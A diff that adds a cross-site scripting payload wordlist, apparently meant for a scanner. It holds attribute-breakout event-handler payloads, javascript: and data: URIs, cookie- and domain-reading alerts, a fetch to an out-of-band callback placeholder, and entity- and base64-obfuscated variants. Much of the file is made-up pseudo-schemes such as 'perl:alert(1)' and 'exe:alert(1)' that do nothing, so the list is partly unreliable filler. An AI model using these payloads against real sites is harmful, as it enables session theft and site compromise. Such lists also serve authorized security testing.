@@ -1,0 +1,74 @@
+" onfocus=alert(1) autofocus="
+' onmouseover=alert(1) '
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:msgbox(1)
+livescript:alert(1)
+mocha:alert(1)
+tcl:alert(1)
+perl:alert(1)
+python:alert(1)
+ruby:alert(1)
+php:alert(1)
+java:alert(1)
+c:alert(1)
+cpp:alert(1)
+csharp:alert(1)
+go:alert(1)
+swift:alert(1)
+kotlin:alert(1)
+scala:alert(1)
+rust:alert(1)
+dart:alert(1)
+lua:alert(1)
+r:alert(1)
+sql:alert(1)
+powershell:alert(1)
+bash:alert(1)
+sh:alert(1)
+zsh:alert(1)
+fish:alert(1)
+cmd:alert(1)
+bat:alert(1)
+vbs:alert(1)
+ps1:alert(1)
+jar:alert(1)
+exe:alert(1)
+com:alert(1)
+scr:alert(1)
+pif:alert(1)
+gadget:alert(1)
+hta:alert(1)
+cpl:alert(1)
+msc:alert(1)
+jar:alert(1)
+apk:alert(1)
+ipa:alert(1)
+app:alert(1)
+deb:alert(1)
+rpm:alert(1)
+msi:alert(1)
+
+# ================================================================
+# JAVASCRIPT URI (No HTML tags needed, for href/src contexts)
+# ================================================================
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:fetch('{{interactsh_url}}')
+
+# Obfuscated javascript: URIs
+JaVaScRiPt:alert(1)
+java&#x09;script:alert(1)
+java&#x0a;script:alert(1)
+&#106;avascript:alert(1)
+&#x6a;avascript:alert(1)
+
+# javascript: with encoding
+javascript:eval(atob('YWxlcnQoMSk='))
+javascript:Function(atob('YWxlcnQoMSk='))()
+
+# DATA URI (for src/href contexts)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:image/svg+xml,<svg onload=alert(1)>
